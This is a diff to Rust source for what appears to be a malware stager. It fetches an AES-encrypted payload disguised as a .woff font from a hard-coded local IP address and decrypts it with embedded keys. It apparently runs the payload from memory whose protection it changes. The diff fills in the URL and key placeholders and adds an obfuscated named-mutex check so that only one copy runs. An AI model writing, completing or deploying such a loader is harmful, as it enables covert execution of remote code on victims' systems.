@@ -1,14 +1,20 @@
+use std::process::exit;
+
 //common use
 use bytes::Bytes;
 use region::{Protection, Allocation};
 use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, KeyIvInit};
+use named_lock::NamedLock;
+use named_lock::Result;
 
 type Aes256CbcDec = cbc::Decryptor<aes::Aes128>;
 
-const URL: &str = "http://URL_REPLACE_ME/test.woff";
+const URL: &str = "http://192.168.78.129:8080/test.woff";
 
-const AESKEY: &str = "AES_KEY_REPLACE_ME";
-const AESIV: &str  = "AES_IV_REPLACE_ME";
+const AESKEY: &str = "oPqVTb-ieogwPT94";
+const AESIV: &str  = "lbzPx4uGUpAx7Wap";
+
+const LOCKNAME: &str = "RLOCK";
 
 fn decrypt(data: &[u8], size: usize) -> Vec<u8> {
     let mut key = [0x42; 16];
@@ -68,5 +74,13 @@ fn dne() -> Result<(), region::Error> {
 }
 
 fn main() {
+    let lock = match NamedLock::create(obfstr::obfstr!(LOCKNAME)) {
+        Ok(lock) => lock,
+        Err(_) => exit(0)
+    };
+    let _guard = match lock.lock() {
+        Ok(g) => g,
+        Err(_) => exit(0)
+    };
     let _ = dne();
 }
